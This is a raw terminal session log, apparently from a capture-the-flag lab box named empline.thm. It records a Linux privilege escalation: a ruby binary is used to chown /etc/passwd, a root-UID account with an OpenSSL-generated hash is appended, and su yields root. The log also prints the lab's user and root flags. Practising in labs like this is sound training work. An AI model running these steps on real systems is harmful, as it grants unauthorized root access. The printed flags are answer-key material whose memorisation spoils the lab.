@@ -1,0 +1,140 @@
+Script started on 2026-10-07 17:26:09+03:00 [COMMAND="ssh george@empline.thm" TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="119" LINES="29"]
+The authenticity of host 'empline.thm (10.80.132.93)' can't be established.
+ED25519 key fingerprint is: SHA256:Zy2CJ55rf4XCqfOlavd68DrxEEE51RIMUi0ps+yk6Tc
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'empline.thm' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+george@empline.thm's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Oct  7 14:26:15 UTC 2026
+
+  System load:  0.11              Processes:           99
+  Usage of /:   4.5% of 38.71GB   Users logged in:     0
+  Memory usage: 51%               IP address for ens5: 10.80.132.93
+  Swap usage:   0%
+
+
+28 updates can be applied immediately.
+7 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+george@empline:~$ ls
+user.txt
+george@empline:~$ cat user.txt
+91cb89c70aa2e5ce0e0116dab099078e
+george@empline:~$ /usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown "george", "george", "/etc/passwd"'
+george@empline:~$ openssl passwd -1 -salt "123" "123"
+$1$123$nE5gIYTYiF1PIXVOFjQaW/
+george@empline:~$ echo "newuser:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd[C[C[C[C[C[C[1P[1P[1P[1P[29@$1$123$nE5gIYTYiF1PIXVOFjQaW/
+george@empline:~$ su newuser
+Password: 
+su: Authentication failure
+george@empline:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+george:x:1002:1002::/home/george:/bin/bash
+newuser:23/:0:0:root:/root:/bin/bash
+george@empline:~$ sed -i '/newuser/d' /etc/passwd
+sed: couldn't open temporary file /etc/sedrXhbxF: Permission denied
+george@empline:~$ echo 'newuser:$1$123$nE5gIYTYiF1PIXVOFjQaW/:0:0:root:/root:/bin/bash' >> /etc/passwd[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1P
+george@empline:~$ echo 'user:$1$123$nE5gIYTYiF1PIXVOFjQaW/:0:0:root:/root:/bin/bash' >> /etc/passwd[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[50Psed -i '/newuser/d'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[16Pcat[C[C[C[C[C[C[C[C[C[C[C[C
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+george:x:1002:1002::/home/george:/bin/bash
+newuser:23/:0:0:root:/root:/bin/bash
+user:$1$123$nE5gIYTYiF1PIXVOFjQaW/:0:0:root:/root:/bin/bash
+george@empline:~$ su user
+Password: 
+su: Authentication failure
+george@empline:~$ su user
+Password: 
+]0;root@empline: /home/georgeroot@empline:/home/george# cd /root
+]0;root@empline: ~root@empline:~# ls
+root.txt
+]0;root@empline: ~root@empline:~# cat root.txt
+74fea7cd0556e9c6f22e6f54bc68f5d5
+]0;root@empline: ~root@empline:~# exit
+exit
+george@empline:~$ exit
+logout
+Connection to empline.thm closed.
+
+Script done on 2026-10-07 17:29:41+03:00 [COMMAND_EXIT_CODE="0"]
